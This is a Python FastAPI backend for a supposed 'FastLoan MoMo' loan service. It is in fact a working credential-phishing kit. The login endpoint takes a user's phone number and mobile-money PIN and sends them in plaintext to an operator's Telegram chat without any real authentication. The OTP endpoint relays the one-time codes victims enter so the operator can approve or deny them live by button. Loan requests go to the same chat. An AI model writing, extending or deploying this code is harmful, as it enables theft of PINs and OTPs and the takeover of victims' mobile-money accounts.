import os
import uuid
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request, Header
from pydantic import BaseModel, Field
from fastapi.middleware.cors import CORSMiddleware
import httpx

# Load environment variables
load_dotenv()

app = FastAPI(title="FastLoan MoMo API")

# --- CORS CONFIGURATION ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
# Set this in Render environment variables if you want security
TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET", "my_super_secret_string")

# In-memory databases
LOAN_REQUESTS = {}
OTP_REQUESTS = {}

# --- HELPER FUNCTIONS ---
async def send_telegram_message(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram token or chat ID missing.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json=payload, timeout=10.0)
        except Exception as e:
            print(f"❌ Failed to connect to Telegram: {e}")

# --- DATA MODELS ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp_code: str

class LoanRequest(BaseModel):
    phone_number: str
    amount: float = Field(..., gt=0)
    months: int = Field(..., gt=0)

# --- ENDPOINTS ---

@app.get("/")
async def root():
    return {"status": "success", "message": "FastLoan MoMo Backend is running!"}

@app.post("/api/login")
async def login(data: LoginRequest):
    await send_telegram_message(
        f"🔐 <b>New Login Attempt</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔑 PIN: {data.pin}"
    )
    return {"status": "success", "message": "OTP sent"}

@app.post("/api/verify-otp")
async def verify_otp(data: OTPRequest):
    otp_id = str(uuid.uuid4())
    OTP_REQUESTS[otp_id] = "pending"

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": (
                f"🔢 <b>New OTP Verification</b>\n\n"
                f"📱 Phone: {data.phone_number}\n"
                f"🔑 Code Entered: <code>{data.otp_code}</code>\n\n"
                f"<i>Approve or Deny this user?</i>"
            ),
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [
                    [
                        {"text": "✅ Approve OTP", "callback_data": f"approve_otp_{otp_id}"},
                        {"text": "❌ Deny OTP", "callback_data": f"deny_otp_{otp_id}"}
                    ]
                ]
            }
        }
        async with httpx.AsyncClient() as client:
            await client.post(url, json=payload, timeout=10.0)

    return {"status": "pending", "otp_id": otp_id}

@app.get("/api/otp-status/{otp_id}")
async def get_otp_status(otp_id: str):
    if otp_id not in OTP_REQUESTS:
        raise HTTPException(status_code=404, detail="OTP not found")
    return {"status": OTP_REQUESTS[otp_id]}

@app.post("/api/apply-loan")
async def apply_loan(data: LoanRequest):
    loan_id = str(uuid.uuid4())
    LOAN_REQUESTS[loan_id] = "pending"

    await send_telegram_message(
        f"💰 <b>New Loan Application</b>\n\n"
        f"📱 Phone: {data.phone_number}\n"
        f"💵 Amount: {data.amount:,.0f} FCFA\n"
        f"📅 Months: {data.months}\n"
        f"🆔 Loan ID: <code>{loan_id}</code>"
    )

    return {"status": "pending", "loan_id": loan_id}

@app.get("/api/loan-status/{loan_id}")
async def get_loan_status(loan_id: str):
    if loan_id not in LOAN_REQUESTS:
        raise HTTPException(status_code=404, detail="Loan not found")
    return {"status": LOAN_REQUESTS[loan_id]}

# --- TELEGRAM WEBHOOK ENDPOINT ---
@app.post("/api/telegram-webhook")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: str = Header(None)):
    if x_telegram_bot_api_secret_token != TELEGRAM_WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid secret token")

    try:
        data = await request.json()

        if "callback_query" in data:
            callback = data["callback_query"]
            callback_id = callback.get("id")
            message = callback.get("message", {})
            chat_id = message.get("chat", {}).get("id")
            message_id = message.get("message_id")
            original_text = message.get("text", "")
            
            action_data = callback.get("data", "")
            
            try:
                action, item_type, item_id = action_data.split("_", 2)
            except ValueError:
                return {"status": "ok"}

            if item_type == "otp" and item_id in OTP_REQUESTS:
                OTP_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                reply_text = "✅ OTP Approved" if action == "approve" else "❌ OTP Denied"
                await update_telegram_message(chat_id, message_id, original_text, reply_text, callback_id)
                
            elif item_type == "loan" and item_id in LOAN_REQUESTS:
                LOAN_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                reply_text = "✅ Loan Approved" if action == "approve" else "❌ Loan Denied"
                await update_telegram_message(chat_id, message_id, original_text, reply_text, callback_id)

    except Exception as e:
        print(f"Webhook error: {e}")
    return {"status": "ok"}

async def update_telegram_message(chat_id, message_id, original_text, reply_text, callback_id):
    async with httpx.AsyncClient() as client:
        await client.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": reply_text}
        )
        try:
            await client.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
                json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": f"{original_text[:4000]}\n\n<b>Result: {reply_text}</b>",
                    "parse_mode": "HTML"
                }
            )
        except Exception:
            pass